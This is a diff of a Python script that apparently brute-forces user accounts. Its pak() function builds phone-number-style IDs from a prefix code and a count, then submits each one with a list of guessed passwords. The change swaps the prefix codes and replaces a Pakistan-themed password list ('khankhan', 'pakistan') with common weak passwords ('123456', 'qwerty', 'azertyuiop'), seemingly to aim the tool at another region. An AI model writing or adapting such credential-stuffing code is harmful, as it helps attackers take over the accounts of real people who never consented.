@@ -379,7 +379,7 @@ def menu():
 def pak():
 		user=[]
 		clear()
-		print('\033[1;35m Code example: 0306,0315,0335,0345')
+		print('\033[1;35m Code example: ,2136,2135,2137')
 		code = input('\033[1;37m put code: ')
 		try:
 			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
@@ -390,7 +390,7 @@ def pak():
 		linex()
 		mthd = input(' Choose: ')
 		clear()
-		print(' [1] Number + khan password')
+		print(' [1] Number + password')
 		linex()
 		pcs = input(' [?] Select: ')
 		for nmbr in range(limit):
@@ -406,7 +406,7 @@ def pak():
 			for psx in user:
 				ids = code+psx
 				if pcs in ['1','01']:
-					passlist = [psx,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
+					passlist = [psx,ids,'123456','12345678','123456789','112233','123123','11223344','1122334455','qwerty','zxcvbn','wxcvbn','qsdfghjklm','azertyuiop']
 				if mthd in ['1','01']:
 					JALIIIL.submit(JALIIIL4,ids,passlist)
 					
